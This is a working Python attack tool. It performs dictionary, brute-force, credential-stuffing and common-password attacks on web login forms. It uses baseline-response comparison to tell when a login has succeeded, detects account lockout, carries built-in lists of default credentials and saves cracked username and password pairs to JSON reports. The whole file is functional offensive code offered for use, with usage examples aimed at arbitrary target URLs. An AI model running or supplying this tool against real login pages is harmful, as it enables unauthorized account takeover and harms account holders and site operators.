#!/usr/bin/env python3
"""
Brute Force Attack Module - ENHANCED VERSION
Performs dictionary and brute force attacks on login forms
Features:
- Dictionary attacks with wordlists
- Smart attacks (common passwords)
- Credential stuffing attacks
- Rate limiting and delay support
- Success detection with multiple indicators
- Session handling and cookies
- Failed login lockout detection
"""

import requests
import sys
import time
import json
from itertools import product
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

class BruteForceAttack:
    def __init__(self, target_url, username_field='username', password_field='password', verbose=False):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.verbose = verbose
        self.success_indicators = [
            'dashboard', 'welcome', 'logout', 'profile', 'success',
            'logged in', 'signed in', 'my account', 'admin panel'
        ]
        self.failure_indicators = [
            'invalid', 'incorrect', 'failed', 'wrong', 'error',
            'denied', 'authentication failed', 'bad credentials',
            'login failed', 'try again'
        ]
        self.lockout_indicators = [
            'locked', 'too many attempts', 'rate limit',
            'temporarily blocked', 'account suspended'
        ]
        self.attempts = 0
        self.successful_creds = []
    
    def test_single_credential(self, username, password, method='POST'):
        """Test a single username/password combination - ENHANCED"""
        data = {
            self.username_field: username,
            self.password_field: password
        }
        
        self.attempts += 1
        
        try:
            if method.upper() == 'POST':
                response = self.session.post(self.target_url, data=data, timeout=10, allow_redirects=True)
            else:
                response = self.session.get(self.target_url, params=data, timeout=10, allow_redirects=True)
            
            response_lower = response.text.lower()
            
            # Check for account lockout
            for indicator in self.lockout_indicators:
                if indicator in response_lower:
                    print(f"\n[!] WARNING: Account lockout detected!")
                    print(f"    Indicator: {indicator}")
                    return 'lockout', response
            
            # CRITICAL FIX: Check response length FIRST
            # If response is identical to baseline, it's definitely NOT a successful login
            if hasattr(self, 'baseline_length'):
                length_diff = abs(len(response.text) - self.baseline_length)
                if self.verbose:
                    print(f"[DEBUG] Response length: {len(response.text)}, Baseline: {self.baseline_length}, Diff: {length_diff}")
                if length_diff < 50:  # Response is essentially identical to baseline
                    # This means the server is ignoring our credentials (no login form exists)
                    if self.verbose:
                        print(f"[DEBUG] REJECTED: Response too similar to baseline ({length_diff} bytes diff)")
                    return False, None
            
            # STRICT CHECK: Must have explicit failure indicators for failed login
            has_failure = any(indicator in response_lower for indicator in self.failure_indicators)
            
            # First priority: Check for explicit success indicators
            has_success = any(indicator in response_lower for indicator in self.success_indicators)
            
            # SUCCESS requires BOTH conditions:
            # 1. Has success indicators AND no failure indicators
            # 2. Response is DIFFERENT from baseline (if baseline exists)
            if has_success and not has_failure:
                if hasattr(self, 'baseline_length'):
                    length_diff = abs(len(response.text) - self.baseline_length)
                    if length_diff > 100:  # Must be significantly different
                        return True, response
                    else:
                        # Has success words but response is identical = false positive
                        return False, None
                else:
                    return True, response
            
            # Second priority: Check for redirect to different page (not login/auth)
            if response.history and len(response.history) > 0:
                original_path = self.target_url.split('/')[-1]
                new_path = response.url.split('/')[-1]
                if new_path != original_path and new_path not in ['login', 'signin', 'auth', 'error', '']:
                    # Only count as success if no failure indicators AND different from baseline
                    if not has_failure and hasattr(self, 'baseline_length'):
                        length_diff = abs(len(response.text) - self.baseline_length)
                        if length_diff > 100:
                            return True, response
            
            # Third priority: Check for new session cookies
            if 'set-cookie' in response.headers:
                cookies = response.headers['set-cookie'].lower()
                if 'session' in cookies or 'auth' in cookies or 'token' in cookies:
                    # Baseline check required
                    if hasattr(self, 'baseline_length'):
                        length_diff = abs(len(response.text) - self.baseline_length)
                        if length_diff > 100 and not has_failure:
                            return True, response
            
            # Fourth priority: Response length difference (requires baseline)
            if hasattr(self, 'baseline_length') and not has_failure:
                length_diff = abs(len(response.text) - self.baseline_length)
                if length_diff > 500:  # MUCH stricter threshold
                    return True, response
            
            # If we reach here, it's a failed login
            return False, None
                
        except requests.Timeout:
            print(f"\n[-] Request timeout")
            return 'timeout', None
        except Exception as e:
            print(f"\n[-] Error: {e}")
            
        return False, None
    
    def dictionary_attack(self, usernames, passwords, method='POST', delay=0.5):
        """Perform dictionary attack with list of usernames and passwords - ENHANCED"""
        print("=" * 70)
        print("BRUTE FORCE - DICTIONARY ATTACK")
        print("=" * 70)
        print(f"Target: {self.target_url}")
        print(f"Method: {method}")
        print(f"Username field: {self.username_field}")
        print(f"Password field: {self.password_field}")
        print(f"Testing {len(usernames)} usernames against {len(passwords)} passwords")
        print("=" * 70)
        
        # Establish baseline
        print("\n[*] Establishing baseline with invalid credentials...")
        try:
            if method.upper() == 'POST':
                baseline_resp = self.session.post(
                    self.target_url, 
                    data={self.username_field: 'invaliduser_xyz_123', self.password_field: 'invalidpass_xyz_123'},
                    timeout=10,
                    allow_redirects=True
                )
            else:
                baseline_resp = self.session.get(
                    self.target_url,
                    params={self.username_field: 'invaliduser_xyz_123', self.password_field: 'invalidpass_xyz_123'},
                    timeout=10,
                    allow_redirects=True
                )
            self.baseline_length = len(baseline_resp.text)
            print(f"[+] Baseline response length: {self.baseline_length} bytes")
        except Exception as e:
            print(f"[-] Could not establish baseline: {e}")
            self.baseline_length = 0
        
        print()
        
        attempts = 0
        total = len(usernames) * len(passwords)
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                print(f"\r[{attempts}/{total}] Testing: {username}:{password}".ljust(80), end='', flush=True)
                
                result, response = self.test_single_credential(username, password, method)
                
                if result == True:
                    print(f"\n[!] SUCCESS! Valid credentials found:")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    self.successful_creds.append((username, password))
                    self.save_report()
                    return username, password
                elif result == 'lockout':
                    print(f"\n[!] Stopping due to account lockout")
                    return None, None
                
                time.sleep(delay)
        
        print(f"\n[-] Attack failed. No valid credentials found.")
        return None, None
    
    def generate_passwords(self, charset, min_length=4, max_length=6):
        """Generate passwords for brute force attack"""
        passwords = []
        for length in range(min_length, max_length + 1):
            for attempt in product(charset, repeat=length):
                passwords.append(''.join(attempt))
                if len(passwords) >= 10000:  # Limit to avoid memory issues
                    return passwords
        return passwords
    
    def credential_stuffing(self, credential_pairs, method='POST', delay=0.5):
        """Credential stuffing attack with leaked username:password pairs - ENHANCED"""
        print("=" * 70)
        print("BRUTE FORCE - CREDENTIAL STUFFING ATTACK")
        print("=" * 70)
        print(f"Target: {self.target_url}")
        print(f"Testing {len(credential_pairs)} credential pairs")
        print("=" * 70)
        
        # Establish baseline with invalid credentials
        print("\n[*] Establishing baseline with invalid credentials...")
        try:
            if method.upper() == 'POST':
                baseline_resp = self.session.post(
                    self.target_url, 
                    data={self.username_field: 'invaliduser_xyz_123', self.password_field: 'invalidpass_xyz_123'},
                    timeout=10,
                    allow_redirects=True
                )
            else:
                baseline_resp = self.session.get(
                    self.target_url,
                    params={self.username_field: 'invaliduser_xyz_123', self.password_field: 'invalidpass_xyz_123'},
                    timeout=10,
                    allow_redirects=True
                )
            self.baseline_length = len(baseline_resp.text)
            print(f"[+] Baseline response length: {self.baseline_length} bytes")
        except Exception as e:
            print(f"[-] Could not establish baseline: {e}")
            self.baseline_length = 0
        
        print()
        
        for i, (username, password) in enumerate(credential_pairs, 1):
            print(f"\r[{i}/{len(credential_pairs)}] Testing: {username}:{password}".ljust(80), end='', flush=True)
            
            result, response = self.test_single_credential(username, password, method)
            
            if result == True:
                print(f"\n[!] SUCCESS! Valid credentials found:")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                self.successful_creds.append((username, password))
                # Continue testing other pairs
            elif result == 'lockout':
                print(f"\n[!] Stopping due to account lockout")
                break
            
            time.sleep(delay)
        
        if self.successful_creds:
            print(f"\n[+] Found {len(self.successful_creds)} valid credential(s)")
            self.save_report()
            return self.successful_creds
        else:
            print(f"\n[-] No valid credentials found")
            return []
    
    def smart_attack(self, username, common_passwords=None, delay=0.5):
        """Attack single username with common passwords - ENHANCED"""
        if common_passwords is None:
            # Expanded common password list
            common_passwords = [
                'password', '123456', '12345678', 'qwerty', 'abc123',
                'password123', 'admin', 'letmein', 'welcome', '123456789',
                'password1', '1234', 'admin123', 'root', 'toor',
                'pass', 'test', 'guest', '12345', '111111',
                '1234567', 'dragon', 'master', 'monkey', 'letmein',
                'login', 'princess', '1234567890', 'starwars',
                'admin@123', 'root@123', 'test123', 'demo', 'user',
                '123', '1234', '12345', 'Password1', 'Admin123',
                f'{username}123', f'{username}@123', username
            ]
        
        print("=" * 70)
        print("BRUTE FORCE - SMART ATTACK (COMMON PASSWORDS)")
        print("=" * 70)
        print(f"Target: {self.target_url}")
        print(f"Username: {username}")
        print(f"Testing {len(common_passwords)} common passwords")
        print("=" * 70)
        
        # Establish baseline with invalid credentials
        print("\n[*] Establishing baseline with invalid credentials...")
        try:
            baseline_resp = self.session.post(
                self.target_url,
                data={self.username_field: 'invaliduser_xyz_123', self.password_field: 'invalidpass_xyz_123'},
                timeout=10,
                allow_redirects=True
            )
            self.baseline_length = len(baseline_resp.text)
            print(f"[+] Baseline response length: {self.baseline_length} bytes")
        except Exception as e:
            print(f"[-] Could not establish baseline: {e}")
            self.baseline_length = 0
        
        print()
        
        for i, password in enumerate(common_passwords, 1):
            print(f"\r[{i}/{len(common_passwords)}] Trying: {password}".ljust(80), end='', flush=True)
            
            result, response = self.test_single_credential(username, password)
            
            if result == True:
                print(f"\n[!] SUCCESS! Password found: {password}")
                self.successful_creds.append((username, password))
                self.save_report()
                return password
            elif result == 'lockout':
                print(f"\n[!] Stopping due to account lockout")
                break
            
            time.sleep(delay)
        
        print(f"\n[-] Attack failed. Password not found in common list.")
        return None
    
    def save_report(self):
        """Save attack results to JSON file"""
        try:
            report = {
                'target': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'attempts': self.attempts,
                'successful_credentials': [
                    {'username': u, 'password': p} for u, p in self.successful_creds
                ],
                'total_success': len(self.successful_creds)
            }
            
            filename = f"reports/bruteforce_{time.strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            
            print(f"\n[+] Report saved to: {filename}")
        except Exception as e:
            print(f"[-] Could not save report: {e}")

def load_wordlist(filename):
    """Load wordlist from file"""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Error loading wordlist: {e}")
        return []

def main():
    if len(sys.argv) < 2:
        print("Usage: python brute_force_attack.py <target_url> [options]")
        print("\nOptions:")
        print("  -u <username>              Single username to test")
        print("  -p <password>              Single password to test")
        print("  -U <userlist_file>         File with usernames")
        print("  -P <passlist_file>         File with passwords")
        print("  -C <cred_file>             Credential pairs file (format: user:pass)")
        print("  --credential-stuffing      Use default credential pairs")
        print("  --user-field <name>        Username field name (default: username)")
        print("  --pass-field <name>        Password field name (default: password)")
        print("  --method <GET|POST>        HTTP method (default: POST)")
        print("  --delay <seconds>          Delay between requests (default: 0.5)")
        print("  --threads <num>            Number of threads (default: 1)")
        print("\nExamples:")
        print("  python brute_force_attack.py http://localhost:5000/login -u admin")
        print("  python brute_force_attack.py http://target.com/login -U users.txt -P passwords.txt")
        print("  python brute_force_attack.py http://target.com/login --credential-stuffing")
        print("  python brute_force_attack.py http://target.com/login -C credentials.txt")
        sys.exit(1)
    
    target_url = sys.argv[1]
    username = None
    password = None
    userlist_file = None
    passlist_file = None
    cred_file = None
    credential_stuffing = False
    username_field = 'username'
    password_field = 'password'
    method = 'POST'
    delay = 0.5
    threads = 1
    
    # Parse arguments
    verbose = False
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '-u':
            username = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '-p':
            password = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '-U':
            userlist_file = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '-P':
            passlist_file = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '-C':
            cred_file = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '--credential-stuffing':
            credential_stuffing = True
            i += 1
        elif sys.argv[i] == '--user-field':
            username_field = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '--pass-field':
            password_field = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '--method':
            method = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '--delay':
            delay = float(sys.argv[i+1])
            i += 2
        elif sys.argv[i] == '--threads':
            threads = int(sys.argv[i+1])
            i += 2
        elif sys.argv[i] == '--verbose' or sys.argv[i] == '-v':
            verbose = True
            i += 1
        else:
            i += 1
    
    attacker = BruteForceAttack(target_url, username_field, password_field, verbose=verbose)
    
    # Credential stuffing attack
    if credential_stuffing or cred_file:
        if cred_file:
            creds = []
            with open(cred_file, 'r') as f:
                for line in f:
                    if ':' in line:
                        u, p = line.strip().split(':', 1)
                        creds.append((u, p))
        else:
            # Default leaked credentials
            creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('root', 'root'),
                ('user', 'user'),
                ('test', 'test'),
                ('guest', 'guest'),
            ]
        attacker.credential_stuffing(creds, method, delay)
    
    # Single credential test
    elif username and password:
        print(f"[*] Testing single credential: {username}:{password}")
        result, _ = attacker.test_single_credential(username, password, method)
        if result == True:
            print("[!] Credentials are valid!")
        else:
            print("[-] Credentials are invalid.")
    
    # Smart attack (single username, common passwords)
    elif username and not passlist_file:
        attacker.smart_attack(username, delay=delay)
    
    # Dictionary attack
    elif userlist_file and passlist_file:
        usernames = load_wordlist(userlist_file)
        passwords = load_wordlist(passlist_file)
        attacker.dictionary_attack(usernames, passwords, method, delay)
    
    else:
        # Default: try common usernames with common passwords
        print("[*] No specific attack mode selected, using default credentials...")
        common_users = ['admin', 'root', 'user', 'test', 'guest']
        common_pass = ['admin', 'password', '123456', 'admin123', 'root']
        attacker.dictionary_attack(common_users, common_pass, method, delay)

if __name__ == "__main__":
    main()
